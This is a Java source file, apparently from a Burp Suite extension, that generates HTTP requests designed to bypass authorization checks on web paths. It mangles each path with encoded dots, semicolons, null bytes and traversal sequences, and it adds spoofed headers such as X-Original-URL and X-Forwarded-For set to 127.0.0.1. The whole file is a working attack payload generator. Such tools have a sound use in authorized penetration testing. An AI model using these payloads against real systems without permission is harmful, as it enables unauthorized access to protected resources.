package burp.auth;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class AuthPayload {



    public List<AuthRequest> suffix(String method, String path) {
        if (path.endsWith("/")) {
            path = path.substring(0, path.length() - 1);
        }
        List<AuthRequest> authRequests = new ArrayList<>();
        List<String> payloads = Arrays.asList(path+"%2e/", path + "/.", "./" + path + "/./", path + "%20/",
                "/%20" + path + "%20/", path + "..;/", path + "?", path + "??", "/" + path + "//",
                path + "/", path + "/.randomstring");

        for (String payload : payloads) {
            if ("GET".equals(method)){
                authRequests.add(new AuthRequest("GET",payload,""));
            }else if ("POST".equals(method)){
                authRequests.add(new AuthRequest("POST",payload,""));
            }else{
                authRequests.add(new AuthRequest("GET",payload,""));
            }
        }

        return authRequests;
    }

    public List<AuthRequest> prefix(String method, String path) {
        List<AuthRequest> authRequests = new ArrayList<>();
        String[] prefix = {";/","images;/../","..%00/","#/../",".;/"};
        for (String s  : prefix) {
            // 将路径按 / 分割为多个部分
            String[] pathParts = path.split("/");
            for (int i = 1; i < pathParts.length; i++) {
                // 输出从第二个部分到最后一个部分
                String[] subPathParts = Arrays.copyOfRange(pathParts, i, pathParts.length);
                String[] prePathParts = Arrays.copyOfRange(pathParts, 1, i);
                if (prePathParts.length > 0) {
                    if ("GET".equals(method)){
                        authRequests.add(new AuthRequest("GET","/"+String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts),""));
                    }
                    else if ("POST".equals(method)){
                        authRequests.add(new AuthRequest("POST","/"+String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts),""));
                    }
                    else{
                        authRequests.add(new AuthRequest("GET","/"+String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts),""));
                    }
                } else {
                    if ("GET".equals(method)){
                        authRequests.add(new AuthRequest("GET","/"+s + String.join("/", subPathParts),""));
                    }
                    else if ("POST".equals(method)){
                        authRequests.add(new AuthRequest("POST","/"+s + String.join("/", subPathParts),""));
                    }else {
                        authRequests.add(new AuthRequest("GET","/"+s + String.join("/", subPathParts),""));
                    }
                }
            }
        }

        return authRequests;
    }

    public List<AuthRequest> headers(String method, String url) {
        List<AuthRequest> authRequests = new ArrayList<>();
        List<String> payloads = Arrays.asList("X-Rewrite-URL: " + url, "X-Original-URL: " + url,
                "Referer: " + url, "X-Custom-IP-Authorization: 127.0.0.1", "X-Originating-IP: 127.0.0.1",
                "X-Forwarded-For: 127.0.0.1", "X-Remote-IP: 127.0.0.1", "X-Client-IP: 127.0.0.1", "X-Host: 127.0.0.1",
                "X-Forwarded-Host: 127.0.0.1");

        for (String payload : payloads) {
            if ("GET".equals(method)){
                authRequests.add(new AuthRequest("GET","",payload));
            }else if ("POST".equals(method)){
                authRequests.add(new AuthRequest("POST","",payload));
            }else{
                authRequests.add(new AuthRequest("GET","",payload));
            }
        }
        return authRequests;
    }


}
